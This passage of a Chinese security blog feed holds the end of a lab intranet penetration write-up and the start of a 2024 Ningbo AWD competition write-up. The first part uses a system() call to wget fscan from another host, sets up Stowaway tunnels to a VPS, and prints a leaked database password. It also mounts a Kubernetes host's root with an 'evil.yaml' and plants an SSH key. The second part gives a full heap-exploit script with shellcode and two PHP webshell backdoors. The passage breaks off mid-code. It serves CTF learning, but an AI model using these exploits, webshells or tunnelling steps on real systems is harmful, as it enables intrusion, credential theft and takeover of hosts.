class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Description: PhpStorm.</span><br><span class="hljs-comment"> * Author: yoby</span><br><span class="hljs-comment"> * DateTime: 2018/12/4 18:01</span><br><span class="hljs-comment"> * Email:logove<span class="hljs-doctag">@qq</span>.com</span><br><span class="hljs-comment"> * Copyright Yoby版权所有</span><br><span class="hljs-comment"> */</span><br><span class="hljs-variable">$img</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;imgbase64&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="hljs-variable">$img</span>, <span class="hljs-variable">$result</span>)) &#123;<br>    <span class="hljs-variable">$type</span> = <span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>) . <span class="hljs-string">&quot;-&quot;</span> . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$type</span>;<br>&#125;<br><span class="hljs-variable">$img</span> =  <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$img</span>));<br>@<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$img</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;src&quot;:&quot;&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>对于上传的校验不完整，只要符合格式是<code>data:image/xxx;base64,xxx</code>这种就行了</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-10.png"></p><p>连上shell后发现有很多disable_functions</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl<br></code></pre></td></tr></table></figure><p>用蚁剑自带的插件绕过即可</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-11.png"></p><p>不过连接前需要修改下<code>.antproxy.php</code>中的<code>$url</code>，加一个<code>/upload</code></p><p>然后就可以执行命令来提权了</p><p>执行<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，发现<code>base32</code>有suid权限，可以利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/fusermount<br>/bin/ping6<br>/bin/mount<br>/bin/su<br>/bin/ping<br>/bin/umount<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/at<br>/usr/bin/staprun<br>/usr/bin/base32<br>/usr/bin/passwd<br>/usr/bin/chsh<br>/usr/bin/sudo<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/s-nail/s-nail-privsep<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-12.png"></p><p>查看网卡情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:01:54:82 brd ff:ff:ff:ff:ff:ff<br>    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::216:3eff:fe01:5482/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:01:a4:5e brd ff:ff:ff:ff:ff:ff<br>    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::216:3eff:fe01:a45e/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>同样的wget下载fscan</p><p><code>http://172.28.23.26/upload/.antproxy.php?a=system(&quot;wget http://172.28.23.17:8080/fscan&quot;);</code></p><p>然后反弹到thinkphp里执行</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-13.png"></p><p>172.22.14.1&#x2F;24 网段存活如下</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.14.37</span><br><span class="hljs-number">172.22.14.46</span><br></code></pre></td></tr></table></figure><h1 id="第二层内网"><a href="#第二层内网" class="headerlink" title="第二层内网"></a>第二层内网</h1><h2 id="建立代理-1"><a href="#建立代理-1" class="headerlink" title="建立代理"></a>建立代理</h2><p>使用<code>Stowaway</code>将内网主机多层代理出来</p><p>1：vps上作为管理端<br><code>./linux_x64_admin -l 2223 -s 2223</code></p><p>2：ThinkPHP (172.28.23.17) 作为跳板<br><code>./linux_x64_agent -c 47.99.77.52:2223 -s 2223 --reconnect 8</code></p><p>3：控制端监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">(admin) &gt;&gt; use 0<br>(node 0) &gt;&gt; listen<br>[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you<span class="hljs-string">&#x27;re controlling was started in the corresponding way!</span><br><span class="hljs-string">[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!</span><br><span class="hljs-string">[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1</span><br><span class="hljs-string">[*] Please input the [ip:]&lt;port&gt; : 8889</span><br><span class="hljs-string">[*] Waiting for response......</span><br><span class="hljs-string">[*] Node is listening on 8889</span><br></code></pre></td></tr></table></figure><p>4：新翔OA (172.28.23.26)连接到ThinkPHP (172.28.23.17)<br><code>./linux_x64_agent -c 172.28.23.17:8889 -s 2223 --reconnect 8</code></p><p>5：然后就可以建立socks代理了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">(node 0) &gt;&gt; socks 7878<br>[*] Trying to listen on 0.0.0.0:7878......<br>[*] Waiting <span class="hljs-keyword">for</span> agent<span class="hljs-string">&#x27;s response......</span><br><span class="hljs-string">[*] Socks start successfully!</span><br></code></pre></td></tr></table></figure><h2 id="Harbor-172-22-14-46"><a href="#Harbor-172-22-14-46" class="headerlink" title="Harbor (172.22.14.46)"></a>Harbor (172.22.14.46)</h2><p>尝试打<a href="https://github.com/404tk/CVE-2022-46463">harbor未授权</a></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-14.png"></p><p>下载secret镜像</p><p><code>python harbor.py http://172.22.14.46/ --dump harbor/secret -v2</code></p><p>得到flag5</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-15.png"></p><h2 id="DooTask-172-22-10-28"><a href="#DooTask-172-22-10-28" class="headerlink" title="DooTask (172.22.10.28)"></a>DooTask (172.22.10.28)</h2><p>下载projectadmin镜像</p><p><code>python harbor.py http://172.22.14.46/ --dump project/projectadmin -v2</code></p><p>run.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">sleep</span> 1<br><br><span class="hljs-comment"># start</span><br>java -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar<br>/usr/bin/tail -f /dev/null<br></code></pre></td></tr></table></figure><p>找到<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>然后反编译</p><p>泄露了数据库账号密码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">spring.datasource.url=jdbc:mysql:<span class="hljs-comment">//172.22.10.28:3306/projectadmin?characterEncoding=utf-8&amp;useUnicode=true&amp;serverTimezone=UTC</span><br>spring.datasource.username=root<br>spring.datasource.password=My3q1i4oZkJm3<br>spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver<br><br>mybatis.type-aliases-<span class="hljs-keyword">package</span>=com.smartlink.projectadmin.entity<br>mybatis.mapper-locations=classpath:mybatis/mapper<span class="hljs-comment">/*.xml</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-16.png"></p><p>直接用MDUT一把梭</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-17.png"></p><h2 id="k8s-172-22-14-37"><a href="#k8s-172-22-14-37" class="headerlink" title="k8s (172.22.14.37)"></a>k8s (172.22.14.37)</h2><p>fscan扫到了10250端口，这个端口有个<code>k8s kubelet 10250端口未授权</code>，但是不符合利用条件</p><p>尝试另一个6443端口的Api Server未授权</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-21.png"></p><p>编辑恶意yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx-deployment</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.8</span><br>        <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/mnt</span><br>          <span class="hljs-attr">name:</span> <span class="hljs-string">test-volume</span><br>      <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test-volume</span><br>        <span class="hljs-attr">hostPath:</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br></code></pre></td></tr></table></figure><p>创建pod</p><p><code>kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/  apply -f evil.yaml</code></p><p>列出pod</p><p><code>kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-18.png"></p><p>进容器</p><p><code>kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-zfgqd /bin/bash</code></p><p>写公钥</p><p><code>echo &quot;ssh-rsa xxxx&quot; &gt; /mnt/root/.ssh/authorized_keys</code></p><p>ssh连接，在数据库中得到flag</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-19.png"></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-20.png"></p><h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><p>大概绘制的拓扑图</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-23.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-172-28-23-17&quot;&gt;&lt;a href=&quot;#ThinkPHP-172-28-23-17&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP (172.28.23.17)&quot;&gt;&lt;/a&gt;ThinkPHP (172.28.23.1</summary>
      
    
    
    
    <category term="内网" scheme="https://www.dr0n.top/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网渗透" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云境" scheme="https://www.dr0n.top/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
    
    <category term="多维挑战" scheme="https://www.dr0n.top/tags/%E5%A4%9A%E7%BB%B4%E6%8C%91%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>2024宁波市第七届网络安全大赛决赛 awd wp</title>
    <link href="https://www.dr0n.top/posts/20b347fd/"/>
    <id>https://www.dr0n.top/posts/20b347fd/</id>
    <published>2024-05-25T10:00:00.000Z</published>
    <updated>2024-05-27T11:54:25.085Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p><strong>攻击</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index\n&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content&#x27;</span>,data)<br><br>p=remote(sys.argv[<span class="hljs-number">1</span>],sys.argv[<span class="hljs-number">2</span>],timeout=<span class="hljs-number">2</span>)<br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br>libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;name&#x27;</span>,<span class="hljs-string">b&#x27;rotwill&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;b mprotect\nc&#x27;)</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x50</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext=libc.address+<span class="hljs-number">0x52085</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>chunk1=d<br>edit(<span class="hljs-number">2</span>,p64(free_hook))<br>chunk6=chunk1-<span class="hljs-number">0x500</span>-<span class="hljs-number">0x10</span><br>payload=flat(&#123;<br>    <span class="hljs-number">0</span>:chunk6+<span class="hljs-number">0x100</span>,<br>    <span class="hljs-number">0x68</span>: chunk6&amp;(~<span class="hljs-number">0xfff</span>),<br>    <span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>,<br>    <span class="hljs-number">0x88</span>: <span class="hljs-number">0x7</span>,<br>    <span class="hljs-number">0xa0</span>:chunk6,<br>    <span class="hljs-number">0xa8</span>: mprotect<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,chunk6,<span class="hljs-number">0x40</span>)+\<br>            shellcraft.write(<span class="hljs-number">1</span>,chunk6,<span class="hljs-number">0x40</span>)<br>payload+=asm(shellcode)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x500</span>,payload)<br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x50</span>,p64(setcontext))<br>free(<span class="hljs-number">6</span>)<br>p.readuntil(<span class="hljs-string">b&quot;flag&#123;&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;flag&#123;&#x27;</span>+p.readuntil(<span class="hljs-string">b&#x27;&#125;&#x27;</span>))<br><br>p.close()<br></code></pre></td></tr></table></figure><p><strong>修复</strong></p><p><img src="/img/awd/2024nb-1.png"></p><p>将触发free函数的操作改为清空对应chunk指针即可</p><p>然后导出替换</p><p><code>cat /tmp/pwn1 &gt; /home/ctf/pwn</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="漏洞1-默认后门"><a href="#漏洞1-默认后门" class="headerlink" title="漏洞1-默认后门"></a>漏洞1-默认后门</h2><p>用D盾直接扫可以扫到两个默认后门</p><p><img src="/img/awd/2024nb-2.png"></p><p><code>public/test.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]))&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>; <span class="hljs-variable">$cmd</span> = (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>); <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>; <span class="hljs-keyword">die</span>; &#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/awd/2024nb-3.png"></p><p><strong>修复</strong></p><p>直接删掉</p><h2 id="漏洞2-默认后门"><a href="#漏洞2-默认后门" class="headerlink" title="漏洞2-默认后门"></a>漏洞2-默认后门</h2><p><code>public/upload/other/20240513/hack.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/awd/2024nb-4.png"></p><p><strong>修复</strong></p><p>直接删掉</p><h2 id="漏洞3-任意文件上传"><a href="#漏洞3-任意文件上传" class="headerlink" title="漏洞3-任意文件上传"></a>漏洞3-任意文件上传</h2><p><code>public/hint.txt</code>得到管理员账号密码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">测试账号<br><br>账号:ADMIN1<br>密码:mypassword<br></code></pre></td></tr></table></figure><p>通过<code>.env</code>可知后台地址映射为<code>oka_admin</code></p><p><img src="/img/awd/2024nb-7.png"></p><p>登录后台后发现在上传头像处没有过滤，可以直接上传</p><p><img src="/img/awd/2024nb-8.png"></p><p>可惜这个点不是未授权，批量利用比较麻烦</p><p><strong>修复</strong></p><p>1：修改密码，后台没找到修改密码的地方，需要进入数据库修改</p><p>2：增加白名单</p><p><code>app/admin/controller/File.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span 